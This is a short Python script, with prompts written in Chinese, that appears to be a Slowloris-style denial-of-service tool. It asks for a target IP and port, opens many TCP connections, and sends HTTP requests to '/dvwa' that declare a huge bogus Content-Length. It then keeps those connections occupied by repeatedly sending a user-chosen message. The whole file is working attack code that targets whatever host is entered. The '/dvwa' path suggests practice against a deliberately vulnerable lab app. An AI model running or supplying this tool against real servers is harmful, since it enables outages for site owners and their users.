import socket
import time
import threading
import string

host=input("输入你的目标IP地址:")
port=int(input("输入渗透的端口:"))
message=input("输入你想要说的话:")
conn=int(input("输入你的连击次数:"))
page=" /dvwa"

buf=("GET %s HTTP/1.1\r\n" "Host:%s\r\n" " User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\r\n"
     "Content-Lenght: 1145141919\r\n" "\r\n" %(page,host))

     #("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
     #("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
     #("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
     #("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")

socks=[]

def conn_thread():
    global socks
    for i in range(0,conn):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bytes(buf,encoding='utf-8'))
            print("[*] 填充完成！发送次数：%d" % i)
            socks.append(s)
        except Exception as ex:
            print("[*] 连接出现了问题！！原因是：%s" % ex)
            time.sleep(2)

def send_thread():
    global socks
    for i in range(10):
        for s in socks:
            try:
                s.send(bytes(message,encoding='utf-8'))
                print(" [*]发送成功！")
            except Exception as ex:
                print(" [x]发生错误！原因可能是：%s" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_start=threading.Thread(target=conn_thread,args=())
send_start=threading.Thread(target=send_thread,args=())
conn_start.start()
send_start.start()